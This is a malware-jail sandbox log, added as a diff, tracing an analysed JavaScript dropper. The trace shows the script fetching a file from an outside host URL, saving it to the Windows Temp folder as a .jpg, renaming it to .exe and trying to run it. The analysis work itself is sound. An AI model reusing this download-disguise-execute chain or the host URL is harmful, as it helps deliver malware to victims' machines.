@@ -1,0 +1,95 @@
+10 Sep 20:14:34 - mailware-jail, a malware sandbox ver. 0.15
+10 Sep 20:14:34 - ------------------------
+10 Sep 20:14:34 - Arguments: /home/maik/gitHub/TFM/fame/storage/8a9f6550f3cd24e7269543debd6b96004e0363cf0520c3bcfdc6c2cfa6a907ee/modified-bueno-sinEval.js
+10 Sep 20:14:34 - Sandbox environment sequence: fame/modules/community/processing/malware_jail/malware-jail/env/utils.js,fame/modules/community/processing/malware_jail/malware-jail/env/eval.js,fame/modules/community/processing/malware_jail/malware-jail/env/function.js,fame/modules/community/processing/malware_jail/malware-jail/env/wscript.js,fame/modules/community/processing/malware_jail/malware-jail/env/browser.js,fame/modules/community/processing/malware_jail/malware-jail/env/agents.js,fame/modules/community/processing/malware_jail/malware-jail/env/other.js,fame/modules/community/processing/malware_jail/malware-jail/env/console.js
+10 Sep 20:14:34 - Malware files: /home/maik/gitHub/TFM/fame/storage/8a9f6550f3cd24e7269543debd6b96004e0363cf0520c3bcfdc6c2cfa6a907ee/modified-bueno-sinEval.js
+10 Sep 20:14:34 - Execution timeout set to: 60 seconds
+10 Sep 20:14:34 - Output file for sandbox dump: fame/modules/community/processing/malware_jail/malware-jail/sandbox_dump_after.json
+10 Sep 20:14:34 - Output directory for generated files: fame/modules/community/processing/malware_jail/malware-jail/output/
+10 Sep 20:14:34 - Download from remote server: No
+10 Sep 20:14:34 - ==> Preparing Sandbox environment.
+10 Sep 20:14:34 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/utils.js quitely
+10 Sep 20:14:34 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/eval.js quitely
+10 Sep 20:14:34 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/function.js quitely
+10 Sep 20:14:34 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/wscript.js quitely
+10 Sep 20:14:34 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/browser.js quitely
+10 Sep 20:14:34 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/agents.js quitely
+10 Sep 20:14:34 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/other.js quitely
+10 Sep 20:14:34 -  => Executing: fame/modules/community/processing/malware_jail/malware-jail/env/console.js quitely
+10 Sep 20:14:34 - ==> Executing malware file(s). =========================================
+10 Sep 20:14:34 -  => Executing: /home/maik/gitHub/TFM/fame/storage/8a9f6550f3cd24e7269543debd6b96004e0363cf0520c3bcfdc6c2cfa6a907ee/modified-bueno-sinEval.js verbosely, reporting silent catches
+10 Sep 20:14:34 - Saving: fame/modules/community/processing/malware_jail/malware-jail/output/_home_maik_gitHub_TFM_fame_storage_8a9f6550f3cd24e7269543debd6b96004e0363cf0520c3bcfdc6c2cfa6a907ee_modified-bueno-sinEval.js
+10 Sep 20:14:34 - Saving: fame/modules/community/processing/malware_jail/malware-jail/output/tr__home_maik_gitHub_TFM_fame_storage_8a9f6550f3cd24e7269543debd6b96004e0363cf0520c3bcfdc6c2cfa6a907ee_modified-bueno-sinEval.js
+10 Sep 20:14:34 - WScript.scriptfullname = (string) '/home/maik/gitHub/TFM/fame/storage/8a9f6550f3cd24e7269543debd6b96004e0363cf0520c3bcfdc6c2cfa6a907ee/modified-bueno-sinEval.js'
+10 Sep 20:14:34 - WScript.arguments = (object) '/home/maik/gitHub/TFM/fame/storage/8a9f6550f3cd24e7269543debd6b96004e0363cf0520c3bcfdc6c2cfa6a907ee/modified-bueno-sinEval.js,xyz'
+10 Sep 20:14:34 - ActiveXObject(MSXML2.XMLHTTP)
+10 Sep 20:14:34 - new MSXML2.XMLHTTP[14]
+10 Sep 20:14:34 - MSXML2.XMLHTTP[14].onreadystatechange = (undefined) 'undefined'
+10 Sep 20:14:34 - MSXML2.XMLHTTP[14].open(GET,http://asopusforums.date/support.php?f=1.doc,false)
+10 Sep 20:14:34 - MSXML2.XMLHTTP[14].method = (string) 'GET'
+10 Sep 20:14:34 - MSXML2.XMLHTTP[14].url = (string) 'http://asopusforums.date/support.php?f=1.doc'
+10 Sep 20:14:34 - MSXML2.XMLHTTP[14].async = (boolean) 'false'
+10 Sep 20:14:34 - MSXML2.XMLHTTP[14].send(undefined)
+10 Sep 20:14:34 - MSXML2.XMLHTTP[14] Not sending data, if you want to interact with remote server, set --down
+10 Sep 20:14:34 - MSXML2.XMLHTTP[14].responsebody = (string) 'MZDumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --dow ... (truncated)'
+10 Sep 20:14:34 - MSXML2.XMLHTTP[14].status = (number) '200'
+10 Sep 20:14:34 - MSXML2.XMLHTTP[14].readystate = (number) '4'
+10 Sep 20:14:34 - MSXML2.XMLHTTP[14].onreadystatechange.get() => (undefined) 'undefined'
+10 Sep 20:14:34 - MSXML2.XMLHTTP[14].send(undefined) finished
+10 Sep 20:14:34 - MSXML2.XMLHTTP[14].status.get() => (number) '200'
+10 Sep 20:14:34 - MSXML2.XMLHTTP[14].responsebody.get() => (string) 'MZDumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --dow ... (truncated)'
+10 Sep 20:14:34 - ActiveXObject(Scripting.FileSystemObject)
+10 Sep 20:14:34 - new Scripting.FileSystemObject[15]
+10 Sep 20:14:34 - new DriveObject[16](C:)
+10 Sep 20:14:34 - DriveObject[16](C:).name = (string) 'C:'
+10 Sep 20:14:34 - new Collection[17]
+10 Sep 20:14:34 - Scripting.FileSystemObject[15].GetSpecialFolder(2) => C:\Users\User\AppData\Local\Temp\
+10 Sep 20:14:34 - ActiveXObject(ADODB.Stream)
+10 Sep 20:14:34 - new ADODB_Stream[18]
+10 Sep 20:14:34 - ADODB_Stream[18].Open()
+10 Sep 20:14:34 - ADODB_Stream[18].type = (number) '1'
+10 Sep 20:14:34 - ADODB_Stream[18].content = (string) 'MZDumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --dow ... (truncated)'
+10 Sep 20:14:34 - ADODB_Stream[18].Write(str) - 11202 bytes
+10 Sep 20:14:34 - ADODB_Stream[18].size = (number) '11202'
+10 Sep 20:14:34 - ADODB_Stream[18].position = (number) '0'
+10 Sep 20:14:34 - ADODB_Stream[18].SaveToFile(C:\Users\User\AppData\Local\Temp\\qutzi7wx7.jpg, 2)
+10 Sep 20:14:34 - ADODB_Stream[18].content.get() => (string) 'MZDumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --dow ... (truncated)'
+10 Sep 20:14:34 - ADODB_Stream[18].Close()
+10 Sep 20:14:34 - ActiveXObject(Scripting.FileSystemObject)
+10 Sep 20:14:34 - new Scripting.FileSystemObject[19]
+10 Sep 20:14:34 - new DriveObject[20](C:)
+10 Sep 20:14:34 - DriveObject[20](C:).name = (string) 'C:'
+10 Sep 20:14:34 - new Collection[21]
+10 Sep 20:14:34 - Scripting.FileSystemObject[19].movefile(C:\Users\User\AppData\Local\Temp\\qutzi7wx7.jpg,C:\Users\User\AppData\Local\Temp\\qutzi7wx7.exe)
+10 Sep 20:14:34 - >>> Silencing catch TypeError: hDiEyaQukPV.Run is not a function
+    at FOZOHEqVfEP (/home/maik/gitHub/TFM/fame/storage/8a9f6550f3cd24e7269543debd6b96004e0363cf0520c3bcfdc6c2cfa6a907ee/modified-bueno-sinEval.js:305:14)
+    at XVviaJ (/home/maik/gitHub/TFM/fame/storage/8a9f6550f3cd24e7269543debd6b96004e0363cf0520c3bcfdc6c2cfa6a907ee/modified-bueno-sinEval.js:308:2)
+    at Vu (/home/maik/gitHub/TFM/fame/storage/8a9f6550f3cd24e7269543debd6b96004e0363cf0520c3bcfdc6c2cfa6a907ee/modified-bueno-sinEval.js:316:1)
+    at /home/maik/gitHub/TFM/fame/storage/8a9f6550f3cd24e7269543debd6b96004e0363cf0520c3bcfdc6c2cfa6a907ee/modified-bueno-sinEval.js:349:16
+    at drq (/home/maik/gitHub/TFM/fame/storage/8a9f6550f3cd24e7269543debd6b96004e0363cf0520c3bcfdc6c2cfa6a907ee/modified-bueno-sinEval.js:287:11)
+    at hDJ (/home/maik/gitHub/TFM/fame/storage/8a9f6550f3cd24e7269543debd6b96004e0363cf0520c3bcfdc6c2cfa6a907ee/modified-bueno-sinEval.js:348:6)
+    at ojmxkt (/home/maik/gitHub/TFM/fame/storage/8a9f6550f3cd24e7269543debd6b96004e0363cf0520c3bcfdc6c2cfa6a907ee/modified-bueno-sinEval.js:356:17)
+    at /home/maik/gitHub/TFM/fame/storage/8a9f6550f3cd24e7269543debd6b96004e0363cf0520c3bcfdc6c2cfa6a907ee/modified-bueno-sinEval.js:297:3
+    at BYgp (/home/maik/gitHub/TFM/fame/storage/8a9f6550f3cd24e7269543debd6b96004e0363cf0520c3bcfdc6c2cfa6a907ee/modified-bueno-sinEval.js:224:11)
+    at /home/maik/gitHub/TFM/fame/storage/8a9f6550f3cd24e7269543debd6b96004e0363cf0520c3bcfdc6c2cfa6a907ee/modified-bueno-sinEval.js:294:4
+10 Sep 20:14:34 - ActiveXObject(Scripting.FileSystemObject)
+10 Sep 20:14:34 - new Scripting.FileSystemObject[22]
+10 Sep 20:14:34 - new DriveObject[23](C:)
+10 Sep 20:14:34 - DriveObject[23](C:).name = (string) 'C:'
+10 Sep 20:14:34 - new Collection[24]
+10 Sep 20:14:34 - Scripting.FileSystemObject[22].movefile(C:\Users\User\AppData\Local\Temp\\qutzi7wx7.jpg,C:\Users\User\AppData\Local\Temp\\qutzi7wx7.exe)
+10 Sep 20:14:34 - >>> Silencing catch TypeError: hDiEyaQukPV.Run is not a function
+    at FOZOHEqVfEP (/home/maik/gitHub/TFM/fame/storage/8a9f6550f3cd24e7269543debd6b96004e0363cf0520c3bcfdc6c2cfa6a907ee/modified-bueno-sinEval.js:305:14)
+    at XVviaJ (/home/maik/gitHub/TFM/fame/storage/8a9f6550f3cd24e7269543debd6b96004e0363cf0520c3bcfdc6c2cfa6a907ee/modified-bueno-sinEval.js:308:2)
+    at Vu (/home/maik/gitHub/TFM/fame/storage/8a9f6550f3cd24e7269543debd6b96004e0363cf0520c3bcfdc6c2cfa6a907ee/modified-bueno-sinEval.js:316:1)
+    at /home/maik/gitHub/TFM/fame/storage/8a9f6550f3cd24e7269543debd6b96004e0363cf0520c3bcfdc6c2cfa6a907ee/modified-bueno-sinEval.js:349:16
+    at drq (/home/maik/gitHub/TFM/fame/storage/8a9f6550f3cd24e7269543debd6b96004e0363cf0520c3bcfdc6c2cfa6a907ee/modified-bueno-sinEval.js:287:11)
+    at hDJ (/home/maik/gitHub/TFM/fame/storage/8a9f6550f3cd24e7269543debd6b96004e0363cf0520c3bcfdc6c2cfa6a907ee/modified-bueno-sinEval.js:348:6)
+    at PTapIlhmqiy (/home/maik/gitHub/TFM/fame/storage/8a9f6550f3cd24e7269543debd6b96004e0363cf0520c3bcfdc6c2cfa6a907ee/modified-bueno-sinEval.js:332:7)
+    at ojmxkt (/home/maik/gitHub/TFM/fame/storage/8a9f6550f3cd24e7269543debd6b96004e0363cf0520c3bcfdc6c2cfa6a907ee/modified-bueno-sinEval.js:361:24)
+    at /home/maik/gitHub/TFM/fame/storage/8a9f6550f3cd24e7269543debd6b96004e0363cf0520c3bcfdc6c2cfa6a907ee/modified-bueno-sinEval.js:297:3
+    at BYgp (/home/maik/gitHub/TFM/fame/storage/8a9f6550f3cd24e7269543debd6b96004e0363cf0520c3bcfdc6c2cfa6a907ee/modified-bueno-sinEval.js:224:11)
+10 Sep 20:14:34 - ==> Cleaning up sandbox.
+10 Sep 20:14:34 - ==> Script execution finished, dumping sandbox environment to a file.
+10 Sep 20:14:34 - The sandbox context has been  saved to: fame/modules/community/processing/malware_jail/malware-jail/sandbox_dump_after.json
+10 Sep 20:14:34 - Saving: fame/modules/community/processing/malware_jail/malware-jail/output/C__Users_User_AppData_Local_Temp__qutzi7wx7.jpg
